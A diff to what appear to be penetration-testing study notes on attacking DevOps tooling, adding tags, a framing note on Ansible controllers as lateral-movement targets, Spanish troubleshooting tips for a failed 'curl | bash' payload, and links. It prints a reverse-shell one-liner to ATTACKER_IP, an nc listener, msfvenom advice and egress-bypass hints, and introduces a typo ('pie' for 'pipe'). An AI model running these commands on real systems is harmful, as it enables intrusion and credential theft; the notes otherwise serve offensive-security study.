@@ -2,8 +2,18 @@
 title: DevOps
 draft: false
 tags:
+  - linux
+  - lateral-movement
+  - post-exploitation
+  - devops
+  - ansible
+  - artifactory
+  - credentials
 ---
  
+> [!Note]
+> DevOps tooling (Ansible controllers, CI/CD, artifact repositories) is a high-value lateral-movement target: controllers usually hold credentials/keys for **many** nodes, often with root/sudo. Enumerate for these after landing a foothold — see [[Linux Enumeration]] — and feed harvested creds/keys into [[Lateral Movement with SSH]] and [[Linux Privilege Escalation]].
+
 # Ansible
 
 _Ansible_ is an infrastructure configuration engine that enables IT personnel to dynamically and automatically configure IT infrastructure and computing resources. [Ansible modules](https://docs.ansible.com/ansible/latest/user_guide/modules_intro.html) are specialized Python scripts that are transported to the nodes by Ansible and then run to perform certain actions (configure settings, run commands, etc).
@@ -155,7 +165,7 @@ test.yml:$ansible$0*0*9661a952b5822af9a21068e7afae3a119ef0312276baf5bc29d6e3ef31
 $ hashcat testhash.txt --force --hash-type=16900 /usr/share/wordlists/rockyou.txt
 ```
 
-4. Copy the original encrypted vault string into a text file and pipe it to **ansible-vault decrypt**. Enter the vault password to retrieve the password for the playbook user:
+4. Copy the original encrypted vault string into a text file and pie it to **ansible-vault decrypt**. Enter the vault password to retrieve the password for the playbook user:
 ```bash
 $ cat pw.txt
 $ANSIBLE_VAULT;1.1;AES256
@@ -476,4 +486,22 @@ curl -fsSL -u ART_USER:ART_PASS "http://controller:8082/artifactory/generic-loca
 ```
 
 TODO: revisar porque no se obtiene la shell
+
+> [!Warning] Notas sobre el TODO anterior (se mantiene el marcador para trazabilidad)
+> Cuando el `curl ... | bash` no devuelve shell, las causas más habituales son:
+> - **Formato del payload**: `msfvenom -f sh` genera un dropper que descarga/ejecuta un binario ELF en `/tmp`. Si `/tmp` está montado con `noexec`, el ELF no arranca. Usa una reverse shell nativa que no toque disco:
+> ```bash
+> bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1'
+> ```
+> - **Listener/puerto**: asegúrate de tener el listener levantado *antes* de ejecutar y en el mismo puerto (`nc -lvnp 443`). El 443 puede requerir root en el atacante.
+> - **Egress filtering**: el nodo puede no tener salida directa al atacante. Prueba un puerto permitido (80/443) o pivota — ver [[Pivoting and Port Forwarding]].
+> - **Arquitectura del payload**: verifica que `-p linux/x64/...` coincide con la arquitectura del objetivo (`uname -m`).
+> - **Alternativa fiable**: sube un ELF con `-f elf`, dale permisos y ejecútalo desde una ruta ejecutable en vez de `| bash`. Genera variantes desde [[Shells]] / [[Payloads]].
+
+### Related notes
+- [[Lateral Movement with SSH]] — reutilizar claves/credenciales robadas del controlador
+- [[Linux Enumeration]] — detectar Ansible/Artifactory tras el foothold
+- [[Linux Privilege Escalation]] — escalar con credenciales o permisos débiles de DevOps
+- [[Linux Dumping and Cracking Credentials]] — crackear hashes bcrypt/Vault recuperados
+- [[Shells]] / [[Payloads]] — generar los reverse shells usados arriba
 
